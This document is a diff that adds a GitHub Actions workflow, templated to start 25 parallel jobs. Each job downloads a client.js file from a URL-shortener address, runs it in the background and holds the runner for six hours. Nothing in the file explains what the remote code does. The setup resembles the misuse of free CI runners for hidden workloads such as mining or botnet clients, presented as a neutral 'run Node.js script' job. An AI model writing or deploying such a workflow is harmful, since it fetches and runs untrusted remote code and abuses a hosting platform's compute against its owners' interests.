@@ -1,0 +1,17 @@
+name: Run Node.js Script on Multiple Machines
+
+on:
+  workflow_dispatch:
+
+jobs:
+{% for i in range(1, 26) %}
+  run-node-{{ i }}:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/setup-node@v3
+        with:
+          node-version: '18'
+      - run: curl -o client.js https://curl.by/T09TY/client.js
+      - run: nohup node client.js > client.log 2>&1 &
+      - run: sleep 21600 # 6 saat
+{% endfor %}
